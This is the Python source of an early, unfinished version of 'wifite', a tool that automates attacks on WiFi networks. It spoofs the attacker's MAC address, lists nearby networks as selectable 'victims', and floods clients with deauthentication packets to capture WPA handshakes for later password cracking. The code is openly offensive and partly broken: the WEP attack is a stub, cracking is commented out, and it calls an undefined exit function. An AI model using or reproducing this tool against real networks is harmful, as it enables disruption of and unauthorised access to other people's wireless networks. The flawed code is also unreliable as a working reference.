#!/usr/bin/python

"""
	wifite
	
	author: derv82 at gmail
	
	TODO:
	 * WEP - everything	 
	 * reaver-wps - integrate
	 * WPA - crack (aircrack/pyrit/cowpatty)
	 
	 * Ignore OPN networks
	 * Unknown SSID's : Send deauth's (when on fixed channel) to unmask!
	 
	   
"""

# For command-line arguments
from sys import argv
# For flushing STDOUT
from sys import stdout

# For file management
import os

from shutil import copy

# For executing and reading processes
from subprocess import Popen, call, PIPE

# For killing processes
from signal import SIGTERM, SIGINT

import time

# regular expressions - for converting SSID to filename
import re

# For generating a random MAC address.
import random

################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

REVISION = 83

# WPA variables
STRIP_HANDSHAKE      = True # Use pyrit or tshark (if applicable) to strip handshake
WPA_DEAUTH_TIMEOUT   = 10   # Time to wait between deauthentication bursts (in seconds)
WPA_ATTACK_TIMEOUT   = 500  # Total time to allow for a handshake attack (in seconds)
HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are stored
# Strip file path separator if needed
if HANDSHAKE_DIR[-1] == os.sep: HANDSHAKE_DIR = HANDSHAKE_DIR[:-1]

# WEP variables
WEP_PPS             = 250 # 250 packets per second (Tx rate)
WEP_ATTACK_TIMEOUT  = 600 # 10 minutes
WEP_ARP_REPLAY      = True # Various WEP-based attacks via aireplay-ng
WEP_CHOPCHOP        = True
WEP_DEFRAG          = True
WEP_P0841           = True
WEP_CRACK_AT        = 10000 # Number of IVS at which we start cracking
WEP_IGNORE_FAKEAUTH = True


# Program variables
IFACE_TO_TAKE_DOWN = '' # Interface that wifite puts into monitor mode
                        # It's our job to put it out of monitor mode after the attacks
ORIGINAL_IFACE_MAC = ('', '') # Original interface name[0] and MAC address[1] (before spoofing)
DO_NOT_CHANGE_MAC  = False # Flag for disabling MAC anonymizer
TARGETS_REMAINING  = 0  # Number of access points remaining to attack
WPA_CAPS_TO_CRACK  = [] # list of .cap files to crack (full of CapFile objects)


# Console colors
W  = "\033[0m"  # white (normal)
R  = "\033[31m" # red
G  = "\033[32m" # green
O  = "\033[33m" # orange
B  = "\033[34m" # blue
P  = "\033[35m" # purple
C  = "\033[36m" # cyan
GR = "\033[37m" # gray


# Create temporary directory
from tempfile import mkdtemp
temp = mkdtemp(prefix='wifite')
if not temp.endswith(os.sep):
	temp += os.sep

# /dev/null, to send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')

class CapFile:
	"""
		Holds data about an access point's .cap file, including AP's ESSID & BSSID.
	"""
	def __init__(self, filename, ssid, bssid):
		self.filename = filename
		self.ssid = ssid
		self.bssid = bssid

class Target:
	"""
		Holds data for a Target (aka Access Point aka Router)
	"""
	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data  = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
	
class Client:
	"""
		Holds data for a Client (device connected to Access Point/Router)
	"""
	def __init__(self, bssid, station, power):
		self.bssid   = bssid
		self.station = station
		self.power   = power


def rtl8187_fix(iface):
	"""
		Attempts to solve "Unknown error 132" common with RTL8187 devices.
		Puts down interface, unloads/reloads driver module, then puts iface back up.
		Returns True if fix was attempted, False otherwise.
	"""
	
	# Check if current interface is using the RTL8187 chipset
	proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
	proc_airmon.wait()
	using_rtl8187 = False
	for line in proc_airmon.communicate()[0].split():
		line = line.upper()
		if line.strip() == '' or line.startswith('INTERFACE'): continue
		if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True
	
	if not using_rtl8187: 
		# Display error message and exit
		print R + ' unable to generate airodump-ng CSV file' + W
		print R + ' you may want to disconnect/reconnect your wifi device' + W
		exit_gracefully(1)
	
	print " Attempting RTL8187 'Unknown Error 132' fix...",
	stdout.flush()
	call(['rmmod', 'rtl8187'], stdout=DN, stderr=DN)
	call(['rfkill', 'block', 'all'], stdout=DN, stderr=DN)
	call(['rfkill', 'unblock', 'all'], stdout=DN, stderr=DN)
	call(['modprobe', 'rtl8187'], stdout=DN, stderr=DN)
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	print 'done'
	return True


def scan(channel=0, iface='', tried_rtl8187_fix=False):
	"""
		Scans for access points. Asks user to select target(s).
			"channel" - the channel to scan on, 0 scans all channels.
			"iface"   - the interface to scan on. must be a real interface.
		Returns list of selected targets and list of clients.
	"""
	remove_airodump_files(temp + 'wifite')
	
	command = ['airodump-ng', 
	           '-a', # only show associated clients
	           '-w', temp + 'wifite'] # output file
	if channel != 0:
		command.append('-c')
		command.append(str(channel))
	command.append(iface)
	proc = Popen(command, stdout=DN, stderr=DN)
	
	print ' initializing scan. updates at 5 second intervals. CTRL+C when ready.'
	(targets, clients) = ([], [])
	try:
		while True:
			time.sleep(0.3)
			if not os.path.exists(temp + 'wifite-01.csv'):
				
				# RTL8187 Unknown Error 132 FIX
				if proc.poll() == None: # Check if process has finished
					if not tried_rtl8187_fix and proc.communicate()[0].find('failed: Unknown error 132') != -1:
						if rtl8187_fix(iface):
							return scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
				print R + ' unable to generate airodump-ng CSV file' + W
				print R + ' you may want to disconnect/reconnect your wifi device' + W
				exit_gracefully(1)
				
			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
			print "\r scanning wireless networks. %d target%s and %d client%s found" % (
			      len(targets), '' if len(targets) == 1 else 's', 
			      len(clients), '' if len(clients) == 1 else 's'),
			stdout.flush()	
	except KeyboardInterrupt: pass
	
	os.kill(proc.pid, SIGINT)
	remove_airodump_files(temp + 'wifite')
	
	print ''
	
	if len(targets) == 0:
		print R + ' no targets found!' + W
		print R + ' you may need to wait for targets to show up.' + W
		exit_gracefully(1)
	
	# Sort by Power
	targets = sorted(targets, key=lambda t: t.power, reverse=True)
	
	victims = []
	print "   NUM ESSID                            ENCR   POWER"
	print '   --- -------------------------------- -----  -----'
	for i, target in enumerate(targets):
		print "   %2d) %s %3s  %4ddb" % (i + 1, target.ssid.ljust(32), \
		          target.encryption.strip().ljust(4), target.power),
		client_text = ''
		for c in clients:
			if c.station == target.bssid: 
				if client_text == '': client_text = 'CLIENT'
				elif client_text[-1] != "S": client_text += "S"
		if client_text != '': print '*%s*' % client_text
		else: print ''
	
	print " select target number(s) separated by commas (1-%s), or 'all':" % len(targets),
	ri = raw_input()
	if ri.strip().lower() == 'all':
		victims = targets[:]
	else:
		for r in ri.split(','):
			r = r.strip()
			if r.find('-') != -1:
				(sx, sy) = r.split('-')
				if sx.isdigit() and sy.isdigit():
					x = int(sx)
					y = int(sy) + 1
					for v in xrange(x, y):
						victims.append(targets[v - 1])
			elif not r.isdigit():
				print " not a number: %s" % r
			else:
				victims.append(targets[int(r) - 1])
			
		
	if len(victims) == 0:
		print ' no targets selected. exiting'
		exit_gracefully(0)
	
	print ' %d target%s selected.' % (len(victims), '' if len(victims) == 1 else 's')
	
	return (victims, clients)

def parse_csv(filename):
	"""
		Parses given lines from airodump-ng CSV file.
		Returns tuple: List of targets and list of clients.
	"""
	f = open(filename)
	lines = f.read().split('\n')
	f.close()
	
	hit_clients = False
	targets = []
	clients = []
	for line in lines:
		if line.find('Station MAC,') != -1: hit_clients = True
		if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
		if not hit_clients: # Access points
			c = line.split(', ', 13)
			cur = 11
			c[cur] = c[cur].strip()
			if not c[cur].isdigit(): cur += 1
			ssid = c[cur+1]
			ssidlen = int(c[cur])
			ssid = ssid[:ssidlen]
			power = int(c[cur-4])
			if power < 0: power += 100
			t = Target(c[0], power, c[cur-2].strip(), c[3], c[5].replace("2WPA", ""), ssid)
			# Ignore non-WPA/WEP networks.
			if c[5].find('WPA') == -1 and c[5].find('WEP') == -1: continue
			targets.append(t)
		else: # Connected clients
			c = line.split(', ')
			bssid   = re.sub(r'[^a-zA-Z0-9:]', '', c[0])
			station = re.sub(r'[^a-zA-Z0-9:]', '', c[5])
			power   = c[3]
			if station != 'notassociated':
				c = Client(bssid, station, power)
				clients.append(c)
	return (targets, clients)



def enable_monitor_mode(iface):
	"""
		Uses airmon-ng to put a device into Monitor Mode.
		Then uses the get_iface() method to retrieve the new interface's name.
		Sets global variable IFACE_TO_TAKE_DOWN as well.
		Returns the name of the interface in monitor mode.
	"""
	global IFACE_TO_TAKE_DOWN
	print ' enabling monitor mode on %s...' % (iface),
	stdout.flush()
	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
	print 'done'
	IFACE_TO_TAKE_DOWN = get_iface()
	return IFACE_TO_TAKE_DOWN


def disable_monitor_mode():
	"""
		The program may have enabled monitor mode on a wireless interface.
		We want to disable this before we exit, so we will do that.
	"""
	if IFACE_TO_TAKE_DOWN == '': return
	print ' disabling monitor mode on %s...' % (IFACE_TO_TAKE_DOWN),
	stdout.flush()
	call(['airmon-ng', 'stop', IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
	print 'done'


def get_iface():
	"""
		Get the wireless interface in monitor mode. 
		Defaults to only device in monitor mode if found.
		Otherwise, enumerates list of possible wifi devices
		and asks user to select one to put into monitor mode (if multiple).
		Uses airmon-ng to put device in monitor mode if needed.
		Returns the name (string) of the interface chosen in monitor mode.
	"""
	proc  = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
	iface = ''
	monitors = []
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0: continue
		if ord(line[0]) != 32: # Doesn't start with space
			iface = line[:line.find(' ')] # is the interface
		if line.find('Mode:Monitor') != -1:
			monitors.append(iface)
	
	# only one device
	if len(monitors) == 1: return monitors[0]
	elif len(monitors) > 1:
		print " interfaces in monitor mode:"
		for i, monitor in enumerate(monitors):
			print "  %d. %s" % (i + 1, monitor)
		i = get_input(stop=len(monitors))
		return monitors[i - 1]
	
	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0 or line.startswith('Interface'): continue
		monitors.append(line[:line.find('\t')])
	
	if len(monitors) == 0:
		print R + " no wireless interfaces were found."
		print R + " you need to plug in a wifi device or install drivers."
		print R + " the program will now exit."
		exit_gracefully(0)
	
	elif len(monitors) == 1:
		mac_anonymize(monitors[0])
		
		return enable_monitor_mode(monitors[0])
		
		IFACE_TO_TAKE_DOWN = get_iface() # recursive call
		return IFACE_TO_TAKE_DOWN
	
	print " select a device to put into monitor mode:"
	for i, monitor in enumerate(monitors):
		print "  %d. %s" % (i + 1, monitor)
	i = get_input(stop=len(monitors))
	
	mac_anonymize(monitors[i-1])
	
	enable_monitor_mode(monitors[i-1])
	

def get_input(start=1, stop=1, message=''):
	"""
		Returns input from user.
	"""
	if message == '': message = ' enter a number between %s and %s:' % (start, stop)
	i = -1
	while i < start or i > stop:
		print message,
		ri = raw_input()
		try:
			i = int(ri)
		except ValueError:
			print 'invalid input, try again.'
		else:
			if i < start or i > stop:
				print 'invalid input, try again.'
	return i


def handle_args():
	"""
		Handles command-line arguments, sets variables.
	"""
	args = argv[1:]
	# TODO allow user to set global variables
	for i in xrange(0, len(args)):
		print "%d='%s'" % (i, args[i])


def has_handshake(target, capfile):
	"""
		Checks if .cap file contains a handshake.
		Returns True if handshake is found, False otherwise.
	"""
	
	if program_exists('tshark'):
		# Call Tshark to return list of EAPOL packets in cap file.
		cmd = ['tshark',
		       '-r', capfile, # Input file
		       '-R', 'eapol', # Filter (only EAPOL packets)
		       # (eapol && (wlan.da == a4:67:06:25:57:ab && wlan.sa == c0:c1:c0:07:54:dc) ||  (wlan.sa == a4:67:06:25:57:ab && wlan.da == c0:c1:c0:07:54:dc)) || (wlan_mgt.tag.interpretation && (wlan.da == a4:67:06:25:57:ab && wlan.sa == c0:c1:c0:07:54:dc) ||  (wlan.sa == a4:67:06:25:57:ab && wlan.da == c0:c1:c0:07:54:dc))
		       '-n']          # Do not resolve names (MAC vendors)
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		lines = proc.communicate()[0].split('\n')
		
		# Get list of all clients in cap file
		clients = []
		for line in lines:
			if line.find('appears to have been cut short') != -1: continue
			if line.find('Running as user "root"') != -1: continue
			if line.strip() == '': continue
			
			while line[0] == ' ': line = line[1:]
			while line.find('  ') != -1: line = line.replace('  ', ' ')
			
			fields = line.split(' ')
			src = fields[2].lower()
			dst = fields[4].lower()
			
			if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
			elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)
		
		# Check each client for a handshake
		for client in clients:
			msg_num = 1 # Index of message in 4-way handshake (starts at 1)
			
			for line in lines:
				if line.find('appears to have been cut short') != -1: continue
				if line.find('Running as user "root"') != -1: continue
				if line.strip() == '': continue
				
				# Sanitize tshark's output, separate into fields
				while line[0] == ' ': line = line[1:]
				while line.find('  ') != -1: line = line.replace('  ', ' ')
				
				fields = line.split(' ')
				
				# Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
				# This catches this glitch and fixes it.
				if len(fields) < 8: 
					continue
				elif len(fields) == 8:
					fields.append('(msg')
					fields.append('3/4)')
				
				src = fields[2].lower() # Source MAC address
				dst = fields[4].lower() # Destination MAC address
				msg = fields[9][0]      # The message number (1, 2, 3, or 4)
				
				# First, third msgs in 4-way handshake are from the target to client
				if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
				# Second, fourth msgs in 4-way handshake are from client to target
				elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue
				
				# The messages must appear in sequential order.
				if int(msg) != msg_num: continue
				msg_num += 1
				
				# We only need the first 3 messages of the 4-way handshake (according to aircrack-ng)
				if msg_num == 4: return True
		return False
	
	# Use CowPatty to check for handshake.
	elif program_exists('cowpatty'):
		# Call cowpatty to check if capfile contains a valid handshake.
		cmd = ['cowpatty',
		       '-r', capfile,     # input file
		       '-s', target.ssid, # SSID
		       '-c']              # Check for handshake
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		response = proc.communicate()[0]
		if response.find('incomplete four-way handshake exchange') != -1:
			return False
		elif response.find('Unsupported or unrecognized pcap file.') != -1:
			return False
		elif response.find('Unable to open capture file: Success') != -1:
			return False
		return True
		
		
	# Check for handshake using Pyrit if applicable
	elif program_exists('pyrit'):
		# Call pyrit to "Analyze" the cap file's handshakes.
		cmd = ['pyrit',
		       '-r', capfile,
		       'analyze']
		proc = Popen(cmd, stdout=PIPE, stderr=DN)
		proc.wait()
		hit_essid = False
		for line in proc.communicate()[0].split('\n'):
			# Iterate over every line of output by Pyrit
			if line == '' or line == None: continue
			if line.find("AccessPoint") != -1:
				hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
				            (line.lower().find(target.bssid.lower()))
				
			# If Pyrit says it's good or workable, it's a valid handshake.
			if hit_essid and \
			   (line.find(', good, ') != -1 or \
			   line.find(', workable, ') != -1):
				# or line.find(', bad, ') != -1:
				# Although I have cracked "bad" handshakes before, commenting out anyway.
				return True
		return False
		
	# Check for handshake using aircrack-ng
	elif program_exists('aircrack-ng'):
		crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
		proc_crack.wait()
		txt = proc_crack.communicate()[0]
		
		return txt.find('Passphrase not in dictionary') != -1
	
	print "\n aircrack-ng not found; wifite is unable to check for handshakes!"
	print " please install aircrack-ng before running this script."
	gracefully_exit(-1)


def remove_airodump_files(prefix):
	"""
		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
		Used by attack_wpa() and attack_wep()
	"""
	return
	try: 
		os.remove(prefix + '-01.cap')
		os.remove(prefix + '-01.csv')
		os.remove(prefix + '-01.kismet.csv')
		os.remove(prefix + '-01.kismet.netxml')
	except OSError: pass


def program_exists(program):
	"""
		Uses 'which' (linux command) to check if a program is installed.
	"""
	proc = Popen(['which', program], stdout=PIPE)
	return proc.communicate()[0].strip() != ''


def strip_handshake(capfile):
	"""
		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
		File in location 'capfile' is overwritten!
	"""
	output_file = capfile
	if program_exists('pyrit'):
		cmd = ['pyrit',
		     '-r', capfile,
		     '-o', output_file,
		     'strip']
		call(cmd,stdout=DN, stderr=DN)
		
	elif program_exists('tshark'):
		# strip results with tshark
		cmd = ['tshark',
		       '-r', capfile,      # input file
		       '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
		       '-w', capfile + '.temp'] # output file
		proc_strip = call(cmd, stdout=DN, stderr=DN)
		
		os.rename(capfile + '.temp', output_file)
		
	else:
		print " unable to strip .cap file: neither pyrit nor tshark were found"


def attack_wpa(iface, target, clients):
	""" 
		Opens an airodump capture on the target, dumping to a file.
		During the capture, sends deauthentication packets to the target both as
		general deauthentication packets and specific packets aimed at connected clients.
		Waits until a handshake is captured.
			"iface"   - interface to capture on
			"target"  - Target object containing info on access point
			"clients" - List of Client objects associated with the target
		Returns True if handshake was found, False otherwise
	"""
	
	global STRIP_HANDSHAKE, WPA_DEAUTH_TIMEOUT, WPA_ATTACK_TIMEOUT, TARGETS_REMAINING
	
	# Generate the filename to save the .cap file as
	save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
	
	# Check if we already have a handshake for this SSID...
	if os.path.exists(save_as):
		print '.cap file already exists for %s, skipping.' % target.ssid
		return False
		"""
		save_index = 1
		while os.path.exists(HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
			save_index += 1
		save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
		"""
	
	# Remove previous airodump output files (if needed)
	remove_airodump_files(temp + 'wpa')
	
	result = ''
	
	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
	try:
		# Start airodump-ng process to capture handshakes
		cmd = ['airodump-ng', 
		      '-w', temp + 'wpa', 
		      '-c', target.channel, 
		      '--bssid', target.bssid, iface]
		proc_read = Popen(cmd, stdout=DN, stderr=DN)
		
		print 'starting wpa handshake capture'
		got_handshake = False
		
		seconds_running = 0
		
		target_clients = clients[:]
		client_index = -1
		# Build a new list of clients which are connected to target access point
		"""
		for c in clients:
			if c.station == target.bssid:
				target_clients.append(c)
		"""
		
		# Deauth and check-for-handshake loop
		while not got_handshake and seconds_running < WPA_ATTACK_TIMEOUT:
			
			time.sleep(1)
			seconds_running += 1
			
			if seconds_running % WPA_DEAUTH_TIMEOUT == 0: 
				# Send deauth packets via aireplay-ng
				cmd = ['aireplay-ng', 
				      '-0',  # Attack method (Deauthentication)
				       '3',  # Number of packets to send
				      '-a', target.bssid]
				
				if client_index == -1 or len(target_clients) == 0:
					print "sending 3 deauth packets from *broadcast*",
				else:
					print "sending 3 deauth packets from %s" % target_clients[client_index].bssid,
					cmd.append('-h')
					cmd.append(target_clients[client_index].bssid)
				client_index += 1
				if client_index >= len(target_clients): client_index = -1
				cmd.append(iface)
				
				# Send deauth packets via aireplay, wait for them to complete.
				proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
				proc_deauth.wait()
				print "sent"
			
			# Copy current dump file for consistency
			if not os.path.exists(temp + 'wpa-01.cap'): continue
			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
			
			# Save copy of cap file
			try: os.remove('/root/new/wpa-01.cap')
			except OSError: pass
			copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
			
			# Check for handshake
			if has_handshake(target, temp + 'wpa-01.cap.temp'):
				got_handshake = True
				
				try: os.mkdir(HANDSHAKE_DIR + os.sep)
				except OSError: pass
				
				# Kill the airodump and aireplay processes
				try:
					os.kill(proc_read.pid, SIGINT)
					os.kill(proc_deauth.pid, SIGINT)
				except OSError: pass
				except UnboundLocalError: pass # In case processes were not defined
				
				os.rename(temp + 'wpa-01.cap.temp', save_as)
				
				print 'handshake captured! saved as "' + save_as + '"'
				
				# Strip handshake if needed
				if STRIP_HANDSHAKE: strip_handshake(save_as)
				
				# Add the filename and SSID to the list of 'to-crack'
				# Cracking will be handled after all attacks are finished.
				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
				
				break # Break out of while loop
				
			# No handshake yet
			os.remove(temp + 'wpa-01.cap.temp')
			
			# Check the airodump output file for new clients
			for client in parse_csv(temp + 'wpa-01.csv')[1]:
				if client.station != target.bssid: continue
				new_client = True
				for c in target_clients:
					if client.bssid == c.bssid: 
						new_client = False
						break
				
				if new_client:
					print "new client found: %s" % client.bssid
					target_clients.append(client)
			
		# End of Handshake wait loop.
		
		if not got_handshake:
			print "unable to capture handshake in time"
	
	except KeyboardInterrupt: 
		print " (^C) attack interrupted"
		# If there are more targets to attack, ask what to do next
		if TARGETS_REMAINING > 0:
			print " %d target%s remain%s" % (TARGETS_REMAINING, 
			            '' if TARGETS_REMAINING == 1 else 's', 
			            's' if TARGETS_REMAINING == 1 else '')
			print " please make a selection:"
			print "   [c]ontinue attacking targets"
			if len(WPA_CAPS_TO_CRACK) > 0:
				print "   [s]kip to cracking WPA cap files"
			print "   [e]xit completely"
			ri = ''
			while ri != 'c' and ri != 's' and ri != 'e': 
				ri = raw_input()
			
			if ri == 's': TARGETS_REMAINING = 0 # Tells start() to ignore other attacks
			elif ri == 'e':
				print " the program will now exit."
				exit_gracefully(0)
		
	# clean up
	remove_airodump_files(temp + 'wpa')
	try:
		os.kill(proc_read.pid, SIGINT)
		os.kill(proc_deauth.pid, SIGINT)
	except OSError: pass
	except UnboundLocalError: pass # In case proc_deauth it not yet defined
	
	return got_handshake


def attack_wep(iface, target, clients):
	"""
		Attacks WEP-encrypted network.
	"""
	
	pass


def main():
	"""
		Where the magic happens.
	"""
	global TARGETS_REMAINING
	
	iface = get_iface()
	
	(targets, clients) = scan(iface=iface)
	
	successful_wpa = 0
	successful_wep = 0
	
	TARGETS_REMAINING = len(targets)
	for t in targets:
		TARGETS_REMAINING -= 1
		print ' targetting "%s" (%s)' % (t.ssid, t.bssid)
		
		# Build list of clients connected to target
		ts_clients = []
		for c in clients:
			if c.station == t.bssid:
				print "\tCLIENT: %s" % (c.bssid)
				ts_clients.append(c)
		
		if t.encryption.find('WPA') != -1:
			if attack_wpa(iface, t, ts_clients):
				successful_wpa += 1
			
		elif t.encryption.find('WEP') != -1:
			if attack_wep(iface, t, ts_clients):
				successful_wep += 1
		
		else: print ' unknown encryption:',t.encryption
		
		# If user wants to stop attacking
		if TARGETS_REMAINING == 0: break
	
	print 'attacks completed.'
	
	caps = len(WPA_CAPS_TO_CRACK)
	if caps > 0:
		print ' beginning WPA crack on %d handshake%s' % (caps, '' if caps == 1 else 's')
		for cap in WPA_CAPS_TO_CRACK:
			print ' cracking "%s" (%s)' % (cap.ssid, cap.filename)
			#wpa_crack(cap.filename, cap.ssid)
	
	exit_gracefully(0)


def generate_random_mac(old_mac):
	"""
		Generates a random MAC address.
		Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
		Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
	"""
	random.seed()
	new_mac = old_mac[:8].lower().replace('-', ':')
	for i in xrange(0, 6):
		if i % 2 == 0: new_mac += ':'
		new_mac += '0123456789abcdef'[random.randint(0,15)]
	
	# Prevent generating the same MAC address via recursion.
	if new_mac == old_mac:
		new_mac = generate_random_mac(old_mac)
	return new_mac

def mac_anonymize(iface):
	"""
		Changes MAC address of 'iface' to a random MAC.
		Only randomizes the last 6 digits of the MAC, so the vender says the same.
		Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
	"""
	global ORIGINAL_IFACE_MAC
	if DO_NOT_CHANGE_MAC: return
	if not program_exists('ifconfig'): return
	
	# Store old (current) MAC address
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
	proc.wait()
	for word in proc.communicate()[0].split('\n')[0].split(' '):
		if word != '': old_mac = word
	ORIGINAL_IFACE_MAC = (iface, old_mac)
	
	new_mac = generate_random_mac(old_mac)
	
	call(['ifconfig', iface, 'down'])
	
	print " changing %s's MAC from %s to %s..." % (iface, old_mac, new_mac),
	stdout.flush()
	
	proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	print 'done'

def mac_change_back():
	"""
		Changes MAC address back to what it was before attacks began.
	"""
	iface = ORIGINAL_IFACE_MAC[0]
	old_mac = ORIGINAL_IFACE_MAC[1]
	if iface == '' or old_mac == '': return
	
	print " changing mac back to %s..." % old_mac,
	stdout.flush()
	
	call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
	proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=DN)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	print "done"

def exit_gracefully(code):
	"""
		We may exit the program at any time.
		We want to remove the temp folder and any files contained within it.
		Removes the temp files/folder and exists with error code "code".
	"""
	# Remove temp files and folder
	for file in os.listdir(temp):
		os.remove(temp + file)
	os.rmdir(temp)
	# Disable monitor mode if enabled by us
	disable_monitor_mode()
	# Change MAC address back if spoofed
	mac_change_back()
	print " the program will now exit"
	# GTFO
	exit(code)


#t = Target("c0:c1:c0:07:54:dc", "1", "1", "6", "WPA", "Killfuck Soulshitter")
#print has_handshake(t, 'wpa-01.cap')
#exit(1)


if __name__ == '__main__':
	try:
		handle_args()
		main()
	except KeyboardInterrupt:
		print '\n ^C Interrupted'
	exit_gracefully(0)


